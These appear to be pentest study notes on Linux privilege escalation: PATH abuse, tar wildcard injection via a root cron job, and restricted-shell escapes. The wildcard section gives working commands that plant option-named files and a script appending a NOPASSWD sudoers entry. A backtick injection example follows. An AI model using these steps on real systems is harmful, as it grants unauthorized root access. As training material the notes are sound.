# PATH ABUSE
-----
- If we can add current directory to the $PATH of the system, we can execute any malicious code.
- Adding PATH to the system:
```bash
PATH=.:$PATH
export PATH
```

# WILDCARD ABUSE
-----
|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|

- `tar` command
	- `--checkpoint-action` permits an EXEC action to be executed when a checkpoint is reached.
		- By creating files with these names, when the wildcard is specified, `--cehckpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command line options
	- Suppose we have a cron job that runs every minute to back to the /root directory
```bash
mh dom mon dow command
*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *
```

- Leverage the wild card in the cron job to write out the necessary commands as file names
```bash
echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
# Check to see necessary files are created
ls -la
```
- Once the cron runs, we can check for sudo privilege
```bash
sudo -l
```

# ESCAPING RESTRICTED SHELLS
----
- Restricted shells = shells that limit users to a set  of specific commands
- Some common restricted shells: [Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`), [Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`), [Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`)

## Escaping
#### Command Injection
- Assume a system only allows `ls` command with `ls -l` or `ls -a`. We can inject `pwd` command
```bash
ls -l `pwd`
```
#### Some other ways to escape restricted shells
- Command Substitution
- Command Chaining
- Environment Variables
- Shell Functions
